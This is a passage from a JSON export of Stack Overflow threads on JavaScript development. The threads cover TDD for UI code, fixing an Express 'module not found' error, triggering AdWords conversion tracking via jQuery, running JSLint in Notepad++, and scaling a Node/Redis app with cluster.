(step2)</strong></p>\n\n<pre><code>function ColorCtrl( id ) {\n    $$(\"#mockList li\").forEach(function(item, index) {\n        item.setStyle(\"backgrond-color\", item.getText());\n    });\n    /* Success! */\n}\n</code></pre>\n\n<p>You can probably see the pain point here, you have to keep your mock HTML here on the page in sync with the structure of what your server controls will be. But it does get you a nice system for TDD'ing with JavaScript.</p>\n",
                    "is_accepted": true,
                    "score": 19
                },
                {
                    "body": "<p>See also: <a href=\"http://stackoverflow.com/questions/300855/looking-for-a-better-unit-test-tool-for-javascript\">http://stackoverflow.com/questions/300855/looking-for-a-better-unit-test-tool-for-javascript</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I've found the <a href=\"http://en.wikipedia.org/wiki/Model%5FView%5FPresenter\" rel=\"nofollow\">MVP</a> architecture to be very suitable for writing testable UIs. Your <strong>Presenter</strong> and <strong>Model</strong> classes can simply be 100% unit tested. You only have to worry about the <strong>View</strong> (which should be a dumb, thin layer only that fires events to the Presenter) for UI testing (with Selenium etc.)</p>\n\n<p>Note that in the I'm talking about using MVP entirely in the UI context, without necessarily crossing to the server-side. Your UI can have its own Presenter and Model that lives entirely on the client-side. The Presenter drives the UI interaction/validation etc. logic while the Model keeps state information and provides a portal to the backend (where you can have a separate Model).</p>\n\n<p>You should also take a look at the <a href=\"http://www.atomicobject.com/pages/Presenter%2BFirst\" rel=\"nofollow\">Presenter First</a> TDD technique.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>What I do is to poke the Dom to see if I'm getting what I expect.  A great side effect of this is that in making your tests fast, you also make your app fast.</p>\n\n<p>I just released an open source toolkit which will help with JavaScript tdd immensely.  It is a composition of many open source tools which gives you a working requirejs backbone app out of the box.</p>\n\n<p>It provides single commands to run: dev web server, jasmine single browser test runner, jasmine js-test-driver multi browser test runner, and concatenization/minification for JavaScript and CSS. It also outputs an unminified version of your app for production debugging, precompiles your handlebar templates, and supports internationalization.</p>\n\n<p>No setup is required. It just works.</p>\n\n<p><a href=\"http://github.com/davidjnelson/agilejs\" rel=\"nofollow\">http://github.com/davidjnelson/agilejs</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I've had a lot of trouble trying to come up with the best way to properly follow TDD principles while developing UI in JavaScript.  What's the best way to go about this?</p>\n\n<p>Is it best to separate the visual from the functional?  Do you develop the visual elements first, and then write tests and then code for functionality?</p>\n",
            "last_activity_date": 1370701364,
            "question_id": 96086,
            "score": 40,
            "tags": [
                "javascript",
                "user-interface",
                "tdd"
            ],
            "title": "Developing UI in JavaScript using TDD Principles"
        },
        {
            "answer_count": 12,
            "answers": [
                {
                    "body": "<p>I had the same problem. This worked for me though:</p>\n\n<p>Seems like npm (now?) installs node modules to <code>/usr/local/lib/node_modules/</code> and not <code>/usr/local/lib/node/</code></p>\n\n<p>What I did was simply to copy everything from node_modules to node: <code>sudo cp -r /usr/local/lib/node_modules/* usr/local/lib/node/</code> and now it seems to be working for me.</p>\n\n<p>Hope this helps you :-)</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>It appears that while npm had been updated to install global modules into /usr/local/lib/node_modules, Node's own require.paths does not yet reflect this change. </p>\n\n<p>There are two reasonable solutions:</p>\n\n<p><code>1.</code> Add the following code to the top of your application:</p>\n\n<pre><code>require.paths.push('/usr/local/lib/node_modules');\n</code></pre>\n\n<p>Pro: non-invasive, easy to add</p>\n\n<p>Con: requires discipline, future versions of node <em>will</em> restrict access to require.paths</p>\n\n<p><code>2.</code> As root, execute:</p>\n\n<pre><code>ln -s /usr/local/lib/node_modules /usr/local/lib/node\n</code></pre>\n\n<p>Pro: reasonably non-invasive</p>\n\n<p>Con: requires root, modifies linux fs, might not survive system updates    </p>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>Use local installs for require(), and global installs for command-line apps.</p>\n\n<p>If you need both, use the <code>npm link</code> command.</p>\n",
                    "is_accepted": false,
                    "score": 21
                },
                {
                    "body": "<ul>\n<li><p>Install express</p>\n\n<p><code>npm install -g express</code></p></li>\n<li><p>Create a new app</p>\n\n<p><code>express your_app</code></p></li>\n<li><p>cd into app directory</p>\n\n<p><code>cd your_app</code></p></li>\n<li><p>use npm link to resolve modules</p>\n\n<p><code>npm link express</code></p></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 60
                },
                {
                    "body": "<p>What about <code>NODE_PATH=/usr/local/lib/node_modules</code> in <em>.bashrc</em> or <em>.bash_profile</em>? I think it's the real correct way.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>It looks like the easiest way to do this is to run <code>npm install</code> from your app's folder. This tells npm to hook everything up.</p>\n\n<p>It's the last instruction after <code>express &lt;appname&gt;</code>:</p>\n\n<pre><code>...\ndont forget to install dependencies:\n$ cd &lt;appname&gt; &amp;&amp; npm install\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>It may happen, if you're using windows, that the environment variable NODE_PATH is not set, and thus when you execute node fileName.js it won't find the libraries. \nCheck for the variable on your console, and if not present, create it. Give it the NODE_HOME\\node_modules value, where NODE_HOME is your node install dir. This path is where npm install puts every module upon downloading.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Set <code>NODE_PATH=NODE_HOME\\node_modules</code>.</p>\n\n<p>I'm using windows 7 and it works fine.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>On Ubuntu 12.04 you have to add the <code>export NODE_PATH=/usr/local/lib/node_modules</code> to your /.bashrc to use globally installed modules.</p>\n",
                    "is_accepted": false,
                    "score": 17
                },
                {
                    "body": "<p>require.paths is removed, use the NODE_PATH environment variable instead.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>for all problems with express with a mac computer:</p>\n\n<p>The solution is: </p>\n\n<p>1.- chown to your user the .npm folder : </p>\n\n<p>sudo chown -R Webmaste /Users/webmaste/.npm/</p>\n\n<ol>\n<li>At your test folder or your folder: </li>\n</ol>\n\n<p>sudo npm install -g express@2.5.8</p>\n\n<ol>\n<li>Invoke express from your actual location: </li>\n</ol>\n\n<p>/usr/local/share/npm/bin/express</p>\n\n<p>4: sudo cd . &amp;&amp; npm install</p>\n\n<p>5: finally: </p>\n\n<p>node app</p>\n\n<hr>\n\n<p>the final message in the console should look like this: </p>\n\n<p>Express server listening on port 3000 in development mode</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>for mac users</p>\n\n<pre><code>cd /usr/local/lib/node\nsudo ln -s ../node_modules/* ./$1\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>When I try to run the app.js file created by express, I get the following error:</p>\n\n<pre><code>$ node app.js\n\nnode.js:134\n        throw e; // process.nextTick error, or 'error' event on first tick\n        ^\nError: Cannot find module 'express'\n    at Function._resolveFilename (module.js:320:11)\n</code></pre>\n\n<p>When I type in 'express --version' I get a return statement of 2.3.3. I used npm to install express. I had to manually make npm using these instructions:</p>\n\n<pre><code>git clone http://github.com/isaacs/npm.git\ncd npm\nsudo make install\n</code></pre>\n\n<p>The error is <code>Error: Cannot find module 'express'</code>.</p>\n\n<p>Do I need to do something after installing npm and express in order to make express see the modules created by npm?</p>\n\n<p>My node is version: 0.4.6\nMy express is version: 2.3.3\nMy npm is version: 1.0.6</p>\n\n<p>Express is installed globally. I used the -g flag to install it.</p>\n\n<p>Edit: When I try \"node -e require.paths\" I get:</p>\n\n<p>[ '/home/user/.node_modules',\n  '/home/user/.node_libraries',\n  '/usr/local/lib/node' ]</p>\n\n<p>So, node isn't detecting the npm installation. How do I get node to detect the npm installation?</p>\n",
            "last_activity_date": 1422368683,
            "question_id": 5919629,
            "score": 38,
            "tags": [
                "javascript",
                "node.js",
                "express",
                "npm"
            ],
            "title": "Express module not found when installed with NPM"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>If you're using jQuery in your pages, why don't you use the <a href=\"http://api.jquery.com/jQuery.getScript/\"><code>getScript</code></a> method of the same to poll the conversion tracking script after setting the required variables?</p>\n\n<p>This is what I usually do, once I've received a <strong>success response</strong> from my AJAX calls.</p>\n\n<pre><code>var google_conversion_id = &lt;Your ID Here&gt;;\nvar google_conversion_language = \"en\";\nvar google_conversion_format = \"3\";\nvar google_conversion_color = \"ffffff\";\nvar google_conversion_label = \"&lt;Your Label here&gt;\";\nvar google_conversion_value = 0;\nif (100) {\n    google_conversion_value = &lt;Your value here if any&gt;;\n}\n$jQ.getScript( \"http://www.googleadservices.com/pagead/conversion.js\" );\n</code></pre>\n\n<p>This works just fine for me. If you want a more detailed example:</p>\n\n<pre><code>$.ajax({\n    async:      true,\n    type:       \"POST\",\n    dataType:   \"json\",\n    url:        &lt;Your URL&gt;,\n    data:       _data,\n    success:    function( json ) {\n\n            // Do something\n            // ...\n\n            // Track conversion\n            var google_conversion_id = &lt;Your ID Here&gt;;\n            var google_conversion_language = \"en\";\n            var google_conversion_format = \"3\";\n            var google_conversion_color = \"ffffff\";\n            var google_conversion_label = \"&lt;Your Label here&gt;\";\n            var google_conversion_value = 0;\n            if (100) {\n                google_conversion_value = &lt;Your value here if any&gt;;\n            }\n            $.getScript( \"http://www.googleadservices.com/pagead/conversion.js\" );\n\n        } // success\n});\n</code></pre>\n\n<p>If you use other libraries such as Mootools or Prototype, I'm sure they have similar in-built methods. This AFAIK is one of the cleanest approaches.</p>\n",
                    "is_accepted": true,
                    "score": 30
                },
                {
                    "body": "<p>this simple code worked for me (the $.getScript version didn't).</p>\n\n<pre><code>var image = new Image(1,1);\nimage.src = 'http://www.googleadservices.com/pagead/conversion/' + id + '/?label=' + label + ' &amp;guid=ON&amp;script=0';\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>After trying everything the link Funka provided (<a href=\"http://articles.adamwrobel.com/2010/12/23/trigger-adwords-conversion-on-javascript-event\" rel=\"nofollow\">http://articles.adamwrobel.com/2010/12/23/trigger-adwords-conversion-on-javascript-event</a>) was what worked for me. Like he said it's scary to overwrite document.write, but\nIt seems like this is what you have to do unless you can load the script before the page load.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Since the script uses <code>document.write</code> so it needs to be re-written </p>\n\n<pre><code>document.write = function(node){ // exactly what document.write should of been doing..\n  $(\"body\").append(node);\n}\n    window.google_tag_params = {\n        prodid: pageId,\n        pagetype: pageTypes[pageType] || \"\",\n        value: \"234324342\"\n    };\n    window.google_conversion_id = 2324849237;\n    window.google_conversion_label = \"u38234j32423j432kj4\";\n    window.google_custom_params = window.google_tag_params;\n    window.google_remarketing_only = true;\n\n    $.getScript(\"http://www.googleadservices.com/pagead/conversion.js\")\n.done(function() {\n      // script is loaded.\n    });\n</code></pre>\n\n<p>See <a href=\"https://gist.github.com/c7a316972128250d278c\" rel=\"nofollow\">https://gist.github.com/c7a316972128250d278c</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>All I do is return the code (or in our case, an image) along with the \"success\" message in the callback.</p>\n\n<p>When a contact form is submitted, or a registration form filled out and submitted, we post to a php script using jQuery, then output a \"thank-you\" message to a div:</p>\n\n<blockquote>\n  <p><em>\"<code>$first_name</code>, Thanks for requesting more information. A representative will contact you shortly.\"</em></p>\n</blockquote>\n\n<p>... followed by the 1x1 gif Google provides.</p>\n\n<p>Here's the jQuery:</p>\n\n<pre><code>$.post('script.php',{'first_name':first_name,'last_name':last_name,'email':email,'phone1':phone1,'password':password,},function(data){\nvar result=data.split(\"|\");\nif(result[0] ==='success'){\n$('#return').html(result[1] + $result[2]);\n</code></pre>\n\n<p>And the php...</p>\n\n<pre><code>echo 'success|'.$first_name.', Thanks for requesting more information.\nA representative will contact you shortly.|&lt;img height=\"1\" width=\"1\" alt=\"\" src=\"http://www.googleadservices.com/pagead/conversion/xxxxxxxx/imp.gif?value=0&amp;amp;label=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;amp;script=0\"/&gt;';\n</code></pre>\n\n<p>You might need to throw in a \"<code>document.location.reload();</code>\" if it isn't being picked up by google</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>// This takes care of it for jQuery. Code can be easily adapted for other javascript libraries:</p>\n\n<pre><code>        function googleTrackingPixel() {\n            // set google variables as globals\n            window.google_conversion_id = 1117861175\n            window.google_conversion_language = \"en\"\n            window.google_conversion_format = \"3\"\n            window.google_conversion_color = \"ffffff\"\n            window.google_conversion_label = \"Ll49CJnRpgUQ9-at5QM\"\n            window.google_conversion_value = 0\n\n            var oldDocWrite = document.write // save old doc write\n\n            document.write = function(node){ // change doc write to be friendlier, temporary\n                $(\"body\").append(node)\n            }\n\n            $.getScript(\"http://www.googleadservices.com/pagead/conversion.js\", function() {\n\n                setTimeout(function() { // let the above script run, then replace doc.write\n                    document.write = oldDocWrite\n                }, 100)\n\n            })\n        }\n</code></pre>\n\n<p>// and you would call it in your script on the event like so:</p>\n\n<pre><code>$(\"button\").click( function() {\n   googleTrackingPixel()\n})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>As you have seen, the google conversion tag only calls on a redraw. I had to make sure it was called when a part of a page was redrawn. (Due to some bad website design that I could not fix at the moment.) So I wrote a function to call from an onClick event.</p>\n\n<p>Essentially, all you have to do is to call doConversion();</p>\n\n<p>Here is what we ended up with:</p>\n\n<pre><code>    // gothelp from from http://www.ewanheming.com/2012/01/web-analytics/website-tracking/adwords-page-event-conversion-tracking\n\n    var Goal = function(id, label, value, url) {\n    this.id = id;\n    this.label = label;\n    this.value = value;\n    this.url = url;\n    };\n\nfunction trackAdWordsConversion(goal, callback) {\n// Create an image\nvar img = document.createElement(\"img\");\n\n// An optional callback function to run follow up processed after the conversion has been tracked\nif(callback &amp;&amp; typeof callback === \"function\") {\n    img.onload = callback;\n}\n// Construct the tracking beacon using the goal parameters\nvar trackingUrl = \"http://www.googleadservices.com/pagead/conversion/\"+goal.id;\ntrackingUrl += \"/?random=\"+new Date().getMilliseconds();\ntrackingUrl += \"&amp;value=\"+goal.value;\ntrackingUrl += \"&amp;label=\"+goal.label;\ntrackingUrl += \"&amp;guid=ON&amp;script=0&amp;url=\"+encodeURI(goal.url);\nimg.src = trackingUrl;\n\n// Add the image to the page \ndocument.body.appendChild(img);\n\n// Don't display the image \nimg.style = \"display: none;\";\n    }\nfunction linkClick(link, goal) {\ntry {\n    // A function to redirect the user after the conversion event has been sent\n    var linkClickCallback = function() {\n        window.location = link.href;\n    };\n\n    // Track the conversion\n    trackAdWordsConversion(goal, linkClickCallback);\n\n    // Don't keep the user waiting too long in case there are problems\n    setTimeout(linkClickCallback, 1000);\n\n    // Stop the default link click\n    return false;\n} catch(err) {\n    // Ensure the user is still redirected if there's an unexpected error in the code\n    return true;\n}\n}\nfunction doConversion() {\nvar g = new Goal(YOUR CODE,YOUR_COOKIE,0.0,location.href);\nreturn linkClick(this,g);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Insert an image dynamically.</p>\n\n<pre><code>jQuery(document.body).append(jQuery('&lt;img height=\"1\" width=\"1\" style=\"border-style:none;\" alt=\"\" src=\"http://www.googleadservices.com/pagead/conversion/XXXXXXXXXX/?value=0&amp;amp;label=XXXXXXXXXXXXXXXXXXX&amp;amp;guid=ON&amp;amp;script=0\"/&gt;'));\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I tried all the ways to manually include conversion.js, it all loaded the script, but didn't further execute what we needed inside the script, there's a simple solution.</p>\n\n<p>Just put your conversion code in a separate HTML, and load it in an iframe.   </p>\n\n<p>I found code to do that at <a href=\"http://www.benjaminkim.com/\" rel=\"nofollow\">http://www.benjaminkim.com/</a> that seemed to work well.</p>\n\n<pre><code>function ppcconversion() {\nvar iframe = document.createElement('iframe');\niframe.style.width = '0px';\niframe.style.height = '0px';\ndocument.body.appendChild(iframe);\niframe.src = '/track.html'; // put URL to tracking code here.\n};\n</code></pre>\n\n<p>then just call ppcconversion() wherever in the JS you like to record it.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Nowadays it is convenient to use the Asynchronous Tag at <code>http://www.googleadservices.com/pagead/conversion_async.js</code> that exposes the <code>window.google_trackConversion</code> function.</p>\n\n<p>This function can be used at any time. For example after submitting a form, like in your case.</p>\n\n<p>See <a href=\"https://developers.google.com/adwords-remarketing-tag/asynchronous/\">https://developers.google.com/adwords-remarketing-tag/asynchronous/</a></p>\n",
                    "is_accepted": false,
                    "score": 13
                }
            ],
            "body": "<p>I'm pretty new to javascript, and therein probably lies my problem.  I'm trying to track AdWords conversions that occur within a widget on our site.  The user fills in a form and the result from the widget is published in the same div without a page refresh.  The issue I'm having is when I try to appendChild (or append in jQuery) both script elements in Google's code (shown below) the page gets 302 redirected to a blank Google page (or at least that's what it looks like through FireBug).\nI'm able to provide a callback method for the results of the form, and that's where I'm trying to insert the AdWords tracking code.  For reference, this is the code provided by Google:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n/* &lt;![CDATA[ */\nvar google_conversion_id = 993834405;\nvar google_conversion_language = \"en\";\nvar google_conversion_format = \"3\";\nvar google_conversion_color = \"ffffff\";\nvar google_conversion_label = \"bSpUCOP9iAIQpevy2QM\";\n/* ]]&gt; */\n&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"http://www.googleadservices.com/pagead/conversion.js\"&gt;\n&lt;/script&gt;\n&lt;noscript&gt;\n&lt;div style=\"display:inline;\"&gt;\n&lt;img height=\"1\" width=\"1\" style=\"border-style:none;\" alt=\"\" src=\"http://www.googleadservices.com/pagead/conversion/993834405/?label=bSpUCOP9iAIQpevy2QM&amp;amp;guid=ON&amp;amp;script=0\"/&gt;\n&lt;/div&gt;\n&lt;/noscript&gt;\n</code></pre>\n\n<p>Pretty standard stuff.  So, what I'm trying to do is insert this into the results page using the callback method (which is provided).  Frankly, I'm redirected no matter when I try to insert this code using js or jQuery (either on original page load or in the callback) so maybe the callback bit is irrelevant, but it's why I'm not just pasting it into the page's code.  </p>\n\n<p>I've tried a number of different ways to do this, but here's what I currently have (excuse the sloppiness.  Just trying to hack my way through this at the moment!):</p>\n\n<pre><code>function matchResultsCallback(data){\n\n    var scriptTag = document.createElement('script');\n    scriptTag.type = \"text/javascript\";\n    scriptTag.text = scriptTag.text + \"/* &lt;![CDATA[ */\\n\";\n    scriptTag.text = scriptTag.text + \"var google_conversion_id \\= 993834405\\;\\n\";  \n    scriptTag.text = scriptTag.text + \"var google_conversion_language \\= \\\"en\\\"\\;\\n\";   \n    scriptTag.text = scriptTag.text + \"var google_conversion_format \\= \\\"3\\\"\\;\\n\";\n    scriptTag.text = scriptTag.text + \"var google_conversion_color \\= \\\"ffffff\\\"\\;\\n\";\n    scriptTag.text = scriptTag.text + \"var google_conversion_label \\= \\\"bSpUCOP9iAIQpevy2QM\\\"\\;\\n\";\n    scriptTag.text = scriptTag.text + \"/* ]]&gt; */\\n\";\n    $('body').append(scriptTag);\n\n    $('body').append(\"&lt;script type\\=\\\"text\\/javascript\\\" src\\=\\\"http://www.googleadservices.com/pagead/conversion.js\\\" /&gt;\");\n    //I have also tried this bit above using the same method as 'scriptTag' with no luck, this is just the most recent iteration.\n\n    var scriptTag2 = document.createElement('noscript');\n    var imgTag = document.createElement('img');\n    imgTag.height = 1;\n    imgTag.width = 1;\n    imgTag.border = 0;\n    imgTag.src = \"http://www.googleadservices.com/pagead/conversion/993834405/?label=bSpUCOP9iAIQpevy2QM&amp;amp;guid=ON&amp;amp;script=0\";\n\n    $('body').append(scriptTag2);\n    $('noscript').append(imgTag);\n}\n</code></pre>\n\n<p>The really odd thing is that when I only insert one of the script tags (it doesn't matter which one), it doesn't redirect.  It only redirects when I try to insert both of them.</p>\n\n<p>I've also tried putting the first script tag into the original page code (as it's not making any calls anywhere, it's just setting variables) and just inserting the conversions.js file and it still does the redirect.</p>\n\n<p>If it's relevant I'm using Firefox 3.6.13, and have tried the included code with both jQuery 1.3 and 1.5 (after realizing we were using v1.3).</p>\n\n<p>I know I'm missing something!  Any suggestions?  </p>\n",
            "last_activity_date": 1411462373,
            "question_id": 5085132,
            "score": 35,
            "tags": [
                "javascript",
                "jquery",
                "google-adwords"
            ],
            "title": "Inserting Google Adwords Conversion Tracking with Javascript or jQuery"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I have managed to get two lint programs to run using the <a href=\"http://notepad-plus.sourceforge.net/\">notepad++</a>'s <a href=\"http://sourceforge.net/project/showfiles.php?group_id=189927&amp;package_id=224034\">NppExec</a> Plugin.</p>\n\n<p>The NppExec plugin is usually installed by default and can be found under plugins -> NppExec. (Using NppExec 0.3 RC1 and Notepad++ 5.1+).\n<br/><br/></p>\n\n<h2>1) JSLint</h2>\n\n<p>first download the <a href=\"http://www.jslint.com/wsh/index.html\">WSH version of jslint</a> from <a href=\"http://www.jslint.com\">http://www.jslint.com</a>.<br>\nModify the last part of the file as follows:</p>\n\n<pre><code>(function() {\n    if(!JSLINT(WScript.StdIn.ReadAll(),{passfail:false})) {\n        var e;\n        for(var i in JSLINT.errors) {\n            e=JSLINT.errors[i];\n            WScript.StdOut.WriteLine('Lint at line '+(e.line+1)+' character '+(e.character+1)+': '+e.reason);\n            WScript.StdOut.WriteLine('    '+(e.evidence||'').replace(/^\\s*(\\S*(\\s+\\S+)*)\\s*$/,\"$1\"));\n        }\n        WScript.Quit(1);\n    }\n}());\n</code></pre>\n\n<p><a href=\"http://lynet.ca/~alumb/jslint/jslint.js\">(Pre-modified version here)</a><br>\nThis causes JSLint to output all of the errors, not just the first one.</p>\n\n<p>Next, Notepad++'s NppExec doesn't allow the use of StdIn so I wrote a <a href=\"http://lynet.ca/~alumb/jslint/jslint.bat\">batch file</a> to actually execute the command.<br>\nThis also allowed me to add a config file that is inserted before all javascript files. The options can be seen <a href=\"http://www.jslint.com/lint.html#options\">here</a>.\nThe batch file looks like this: </p>\n\n<pre><code>@copy /b \"C:\\Program Files\\jslint\\conf.txt\"+%1 \"C:\\Program Files\\jslint\\lastoutput.txt\" &gt; temp.txt\n@cscript /Nologo \"C:\\Program Files\\jslint\\jslint.js\" &lt; \"C:\\Program Files\\jslint\\lastoutput.txt\"\n</code></pre>\n\n<p>You may need to modify the paths depending on where you put the jslint.js file.\nThe <a href=\"http://lynet.ca/~alumb/jslint/conf.txt\">conf.txt</a> file looks like this: </p>\n\n<pre><code>/*jslint forin:true*/\n</code></pre>\n\n<p>Make sure there is no return carriage at the end of this line. If there is a return  carriage all the lines counts will be off by one. </p>\n\n<p>Finally, the command I entered into NppExec is:</p>\n\n<pre><code>\"C:\\Program Files\\jslint\\jslint.bat\" \"$(FULL_CURRENT_PATH)\" \n</code></pre>\n\n<p><br/></p>\n\n<h2>2) Javascript Lint</h2>\n\n<p><a href=\"http://www.javascriptlint.com/\">Javascript lint</a> is a slightly less strict parser and was much easier to implement. </p>\n\n<p>First grab a copy of the windows version from <a href=\"http://www.javascriptlint.com/download.htm\">http://www.javascriptlint.com/download.htm</a> and unzip it. \nThen the NppExec command is:</p>\n\n<pre><code>\"C:\\Program Files\\JavascriptLint\\jsl.exe\" -conf \"C:\\Program Files\\JavascriptLint\\jsl.default.conf\" -process \"$(FULL_CURRENT_PATH)\"\n</code></pre>\n\n<p>(note: Most instructions for Javascript Lint will say to add \"pauseatend\" to the end of the command, I found this caused problems in Notepad++ so I left it off)</p>\n\n<p>Hope this helps someone,<br>\nCheers,<br>\nAndy.</p>\n",
                    "is_accepted": false,
                    "score": 41
                },
                {
                    "body": "<p>You may try JSLint Plugin for Notepad++: </p>\n\n<p><a href=\"https://sourceforge.net/projects/jslintnpp/\">https://sourceforge.net/projects/jslintnpp/</a></p>\n",
                    "is_accepted": true,
                    "score": 37
                },
                {
                    "body": "<p>After you've installed the plugin you should go to:</p>\n\n<p>Plugins -> JSLint -> JSLint options</p>\n\n<p>and change \"Choose JavaScript lint tool:\" to <strong>JSHint</strong>.</p>\n\n<p>JSHint gives alot less meaningless \"errors\".</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have seen other text editors use extensions to allow syntax checkers such as <a href=\"http://www.jslint.com\">JSLint</a>, is this possible with Notepad++?</p>\n",
            "last_activity_date": 1403181605,
            "question_id": 1046810,
            "score": 31,
            "tags": [
                "javascript",
                "notepad++",
                "jslint",
                "lint"
            ],
            "title": "Using JSLint in Notepad++"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Actually, your workload is not really I/O bound: it is CPU bound due to the cost of jade-based dynamic page generation. I cannot guess the complexity of your jade template, but even with simple templates, generating HTML pages is expensive.</p>\n\n<p>For my tests I used this template:</p>\n\n<pre><code>html(lang=\"en\")\n  head\n    title Example\n  body\n    h1 Jade - node template engine\n    #container\n      ul#users\n        each user in items\n          li User:#{user}\n</code></pre>\n\n<p>I added 100 dummy strings to the items key in Redis.</p>\n\n<p>On my box, I get 475 req/s with node.js CPU at 100% (which means 50% CPU consumption on this dual core box). Let's replace:</p>\n\n<pre><code>res.render( 'index', { items: items } );\n</code></pre>\n\n<p>by:</p>\n\n<pre><code>res.send( '&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Jade - node template engine&lt;/h1&gt;&lt;div id=\"container\"&gt;&lt;ul id=\"users\"&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;li&gt;User:NOTHING&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;' );\n</code></pre>\n\n<p>Now, the result of the benchmark is close to 2700 req/s. So the bottleneck is clearly due to the formatting of the HTML page.</p>\n\n<p>Using the cluster package in this situation is a good idea, and it is straightforward. The code can be modified as follows:</p>\n\n<pre><code>var cluster = require('cluster')\n\nif ( cluster.isMaster ) {\n  for ( var i=0; i&lt;2; ++i )\n    cluster.fork();\n} else {\n  var\n      express = require( 'express' ),\n      app     = express.createServer(),\n      redis   = require( 'redis' ).createClient();\n\n  app.configure( function() {\n      app.set( 'view options', { layout: false } );\n      app.set( 'view engine', 'jade' );\n      app.set( 'views', __dirname + '/views' );\n      app.use( express.bodyParser() );\n  });\n\n  function log( what ) { console.log( what ); }\n\n  app.get( '/', function( req, res ) {\n      redis.lrange( 'items', 0, 50, function( err, items ) {\n            if( err ) { log( err ); } else {\n              res.render( 'index', { items: items } );\n            }\n      });\n  });\n\n  app.listen( 8080 );\n}\n</code></pre>\n\n<p>Now the result of the benchmark is close to 750 req/s with 100 % CPU consumption (to be compared with the initial 475 req/s).</p>\n",
                    "is_accepted": true,
                    "score": 33
                }
            ],
